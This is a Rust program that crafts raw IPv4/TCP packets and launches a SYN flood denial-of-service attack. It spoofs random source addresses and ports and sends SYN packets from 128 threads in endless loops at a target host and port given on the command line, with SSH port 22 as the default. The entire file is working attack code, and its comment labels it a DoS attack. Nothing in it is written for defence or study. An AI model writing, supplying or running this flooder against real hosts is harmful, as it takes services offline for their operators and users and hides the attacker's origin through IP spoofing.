#![feature(box_syntax)]


use std::{
    error::Error,
    mem::size_of,
    net::Ipv4Addr,
    str::FromStr,
    thread::{self, JoinHandle},
};

use bincode::{options, Options};
use clap::Parser;
use libc::{
    c_void, getpid, sendto, sockaddr, sockaddr_in, socket, AF_INET, SOCK_RAW,
};
use netlib::{
    aux::{htonl, htons, ntohl, random_u16, HostOrIPv4, random_u32},
    bincode_options,
    data::SockAddrIn,
    err::ErrNo,
    error::NetErr,
    network::{
        inet_cksum,
        ip::{Protocol, IP},
    },
    transport::tcp::{TCP, TcpFlag},
};

const IPSZ: usize = size_of::<IP>();
const TCPSZ: usize = size_of::<TCP>();

const PACKAGE_SIZE: usize = IPSZ + TCPSZ;
static mut RAWSOCK: i32 = 0;


pub unsafe fn quick_send_syn(
    ip_src: u32,
    mut dst: sockaddr_in,
    port_src: u16,
    port_dst: u16,
) -> Result<(), NetErr> {
    let mut sendbuf = [0u8; PACKAGE_SIZE];
    let config = bincode_options!();

    /* SET IP HEADER */
    let mut iphdr = IP {
        // 5 * 4 = 20 bytes, ipv4
        ihl_v: IP::ihl_v(5, 4),
        tos: 0,
        len: htons(PACKAGE_SIZE as u16),
        id: htons(getpid() as u16),
        frag_off: 0,
        ttl: 200,
        protocol: Protocol::TCP as u8,
        checksum: 0,
        ip_src: htonl(ip_src),
        ip_dst: dst.sin_addr.s_addr,
    };
    config
        .serialize_into(&mut sendbuf[..IPSZ], &iphdr)
        .or(Err(NetErr::SerializeFailed))?;

    iphdr.checksum = inet_cksum(sendbuf.as_ptr(), IPSZ);

    config
        .serialize_into(&mut sendbuf[..IPSZ], &iphdr)
        .or(Err(NetErr::SerializeFailed))?;

    /* SET TCP HEADER */
    let mut tcphdr = TCP {
        source: htons(port_src),
        dest: htons(port_dst),
        seq: 0,
        ack_seq: 0,
        doff_flags: TCP::doff_flags(5, &[TcpFlag::Syn, TcpFlag::Urg]),
        window: random_u16(),
        check: 0,
        urgptr: random_u16(),
    };

    let mut checksum_buf = [0u8; 12 + TCPSZ];
    iphdr.write_pseudo_iphdr(&mut checksum_buf, (TCPSZ + 0) as u16);
    config
    .serialize_into(&mut checksum_buf[12..], &tcphdr)
    .or(Err(NetErr::SerializeFailed))?;

    tcphdr.check = inet_cksum(
        checksum_buf.as_ptr(),
        checksum_buf.len()
    );

    config
        .serialize_into(&mut sendbuf[IPSZ..], &tcphdr)
        .or(Err(NetErr::SerializeFailed))?;

    let size = sendto(
        RAWSOCK,
        sendbuf.as_mut_ptr() as *mut c_void,
        PACKAGE_SIZE,
        0,
        &mut dst as *mut sockaddr_in as *mut sockaddr,
        size_of::<sockaddr_in>() as u32,
    );

    let src = Ipv4Addr::from(ip_src);
    // let dst = transmute::<sockaddr_in, SockAddrIn>(dst);
    let dst = Ipv4Addr::from(ntohl(dst.sin_addr.s_addr));

    if size < 0 {
        let errno = ErrNo::fetch();

        eprintln!("{:#?} sendto {:#?} failed({errno:#?})", src, dst);
        return Err(NetErr::SendToFailed);
    } else {
        println!("{:#?} sendto {:#?} succeed", src, dst);
    }

    Ok(())
}

#[allow(unused)]
unsafe fn dos_syn(dst: sockaddr_in, port_dst: u16) {
    loop {
        let ip_src = random_u32();
        let port_src = random_u16();

        match quick_send_syn(ip_src, dst, port_src, port_dst) {
            Ok(_) => {}
            Err(_err) => {}
        }
    }
}


////////////////////////////////////////////////////////////////////////////////
//// Cli

#[derive(Parser)]
#[clap()]
struct Cli {
    #[clap()]
    dst: String,

    port: Option<u16>
}


fn main() -> Result<(), Box<dyn Error>> {
    let cli = Cli::parse();
    let dst = cli.dst;
    let port_dst = cli.port.unwrap_or(22);

    unsafe {
        let hostorip = HostOrIPv4::from_str(&dst)?;

        let dst: Ipv4Addr = hostorip.try_into()?;
        let cdst = SockAddrIn::from(dst).into();

        // IPPROTO_RAW - 255
        RAWSOCK = socket(AF_INET, SOCK_RAW, Protocol::Reserved as i32);
        if RAWSOCK < 0 {
            return Err(box NetErr::CreateRawSocketFailed);
        }

        // TCP SYN DoS Attack
        let threads: Vec<JoinHandle<()>> = (0..128).into_iter()
        .map(move |i| {
            thread::Builder::new()
            .name(format!("dos-child-{}", i))
            .spawn(move || {
                dos_syn(cdst, port_dst)
            }).unwrap()
        })
        .collect();

        for th in threads.into_iter() {
            th.join().unwrap();
        }
    }

    Ok(())
}
